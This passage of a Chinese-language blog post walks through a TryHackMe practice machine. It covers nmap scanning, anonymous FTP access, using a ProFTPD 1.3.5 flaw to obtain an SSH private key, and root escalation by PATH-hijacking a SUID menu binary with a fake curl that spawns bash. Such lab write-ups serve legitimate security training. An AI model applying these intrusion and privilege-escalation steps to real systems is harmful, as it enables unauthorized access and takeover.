href="https://cloud.tencent.com/developer/article/1897800%EF%BC%88%E5%BE%88%E5%85%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E5%A4%A7%E9%83%A8%E5%88%86%E4%B8%8D%E7%94%A8%E8%AE%B0%EF%BC%89">https://cloud.tencent.com/developer/article/1897800（很全，但是大部分不用记）</a></p><p><a href="https://blog.csdn.net/Geroge_Ming/article/details/109711897%EF%BC%88%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%E5%8F%8A%E5%85%B6%E6%9C%8D%E5%8A%A1%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AE%B0%E4%B8%80%E4%B8%8B%EF%BC%89">https://blog.csdn.net/Geroge_Ming/article/details/109711897（常见端口及其服务，可以记一下）</a></p><p>一下就扫完了，我们再用nmap把详细信息扫出来，我通常用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nmap -p<span class="hljs-tag">&lt;<span class="hljs-name">扫出来的端口</span>&gt;</span> -A <span class="hljs-tag">&lt;<span class="hljs-name">ip</span>&gt;</span><br></code></pre></td></tr></table></figure><p>nmap中-A是一个指令，用于执行全面的扫描，因此我通常不去采用-sP，-sT什么的，基本都够用了</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955519.png"></p><p>至此task1基本完成</p><p>通过工具扫描端口并了解其基本信息</p><h2 id="Task-2"><a href="#Task-2" class="headerlink" title="Task 2"></a>Task 2</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955520.png"></p><p>这是个比较基础的靶机，thm上也讲的比较清楚了，把红色的指令复制黏贴即可</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955521.png"></p><p>可以看到<strong>三个</strong>服务，其中应该能引起我们注意的就是中间那个anonymous，匿名</p><p>因为anonymous能够让我们也能够进行访问</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955522.png"></p><p>继续跟着教程走</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955491.png"></p><p>密码这里直接enter就行</p><p>可以看到log.txt,把它弄到我们的主机上</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955492.png"></p><p>继续照着教程来就行了，其实这里ftp在哪个端口运行前面已经有提到了</p><p>但我们还是要看看日志，因为里面可能还有别的内容</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955493.png"></p><p>这里也是直接enter就行</p><p>log.txt很长就不弄上来了，这里把关键信息截个图就算了</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955494.png"></p><p>这题问题的答案</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955495.png"></p><p>一个rsa的key，可能能帮我们进行ssh连接</p><p>差不多就这些，然后继续跟着教程走</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955496.png"></p><p>这个翻译不是很行，应该是挂载着什么东西，但没关系，继续照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955497.png"></p><p>这里应该就是有个var</p><p>到这里的步骤还是在做信息收集，但是相比起前面，我们收集了更多更详细的信息，帮助我们寻找突破口</p><h2 id="Task-3"><a href="#Task-3" class="headerlink" title="Task 3"></a>Task 3</h2><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955498.png"></p><p>还是跟着提示走就行了，task3的关键就是通过proftpd的一些漏洞来获取权限，先nc一下</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> &lt;ip&gt; <span class="hljs-number">21</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955499.png"></p><p>1.3.5</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955500.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955501.png"></p><p>4个</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955502.png"></p><p>两个不用回答的</p><p>老规矩照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955503.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955504.png"></p><p>还是照做</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955505.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955506.png"></p><p>可以看到这里有个id_rsa，把它弄到我们kali里就行</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955507.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955508.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955509.png"></p><p>这样就算是完成了</p><p>到这里，我们初步在目标机上占领据点，可以更深一步去进行攻击</p><h2 id="Task-4"><a href="#Task-4" class="headerlink" title="Task 4"></a>Task 4</h2><p>到这里的任务就是提权</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955483.png"></p><p>先了解这个知识点</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955485.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955486.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955487.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955488.png"></p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955512.png"></p><p><a href="https://img2022.cnblogs.com/blog/2857591/202210/2857591-20221013154847535-1543391356.png"><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955482.png"></a></p><p>观察上图可以得知：当我们执行&#x2F;usr&#x2F;bin&#x2F;menu 时，选择选项1其实是在执行一个<code>curl</code>命令，选择选项2其实是在执行<code>uname -r</code>命令。</p><p>这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用&#x2F;usr&#x2F;bin&#x2F;curl 或&#x2F;usr&#x2F;bin&#x2F;uname运行文件)。</p><p>我们已经知道&#x2F;usr&#x2F;bin&#x2F;menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入&#x2F;bin&#x2F;bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。</p><p>完成以上操作之后，执行SUID文件&#x2F;usr&#x2F;bin&#x2F;menu，产生的效果是：以root权限打开一个bash shell—–这将获得root shell</p><p><img src="https://suuuuhexo.oss-cn-hongkong.aliyuncs.com/202406131955490.png"></p><p>至此完成</p><p>如果有任何问题，欢迎到主页加我的vx交流学习，请注明来意</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>thm</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
